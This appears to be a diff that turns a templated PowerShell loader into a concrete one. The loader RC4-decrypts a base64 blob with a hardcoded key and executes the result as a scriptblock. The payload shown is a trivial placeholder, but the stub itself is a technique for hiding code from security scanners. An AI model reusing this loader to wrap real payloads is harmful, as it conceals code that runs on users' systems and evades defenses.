@@ -1,40 +1,40 @@
-function %{func_rc4_decrypt} {
-    param([Byte[]]$%{var_rc4buffer})
+function decode_bytes {
+    param([Byte[]]$input_bytes)
 
-    $%{var_key} = ([system.Text.Encoding]::UTF8).GetBytes("%{random_key}")
+    $secret_key = ([system.Text.Encoding]::UTF8).GetBytes("s3cret")
 
     $s = New-Object Byte[] 256;
     $k = New-Object Byte[] 256;
 
-    for ($i = 0; $i -lt 256; $i++)
+    for ($index = 0; $index -lt 256; $index++)
     {
-        $s[$i] = [Byte]$i;
-        $k[$i] = $%{var_key}[$i %% $%{var_key}.Length];
+        $s[$index] = [Byte]$index;
+        $k[$index] = $secret_key[$index % $secret_key.Length];
     }
 
-    $j = 0;
-    for ($i = 0; $i -lt 256; $i++)
+    $offset = 0;
+    for ($index = 0; $index -lt 256; $index++)
     {
-        $j = ($j + $s[$i] + $k[$i]) %% 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
+        $offset = ($offset + $s[$index] + $k[$index]) % 256;
+        $temp = $s[$index];
+        $s[$index] = $s[$offset];
+        $s[$offset] = $temp;
     }
 
-    $i = $j = 0;
-    for ($x = 0; $x -lt $%{var_rc4buffer}.Length; $x++)
+    $index = $offset = 0;
+    for ($x = 0; $x -lt $input_bytes.Length; $x++)
     {
-        $i = ($i + 1) %% 256;
-        $j = ($j + $s[$i]) %% 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
-        [int]$t = ($s[$i] + $s[$j]) %% 256;
-        $%{var_rc4buffer}[$x] = $%{var_rc4buffer}[$x] -bxor $s[$t];
+        $index = ($index + 1) % 256;
+        $offset = ($offset + $s[$index]) % 256;
+        $temp = $s[$index];
+        $s[$index] = $s[$offset];
+        $s[$offset] = $temp;
+        [int]$t = ($s[$index] + $s[$offset]) % 256;
+        $input_bytes[$x] = $input_bytes[$x] -bxor $s[$t];
     }
 
-    $%{var_rc4buffer}
+    $input_bytes
 }
 
-&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((%{func_rc4_decrypt} ([System.Convert]::FromBase64String("%{b64payload}"))))))
+&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((decode_bytes ([System.Convert]::FromBase64String("JAB4ID0gJ29rJw=="))))))
 
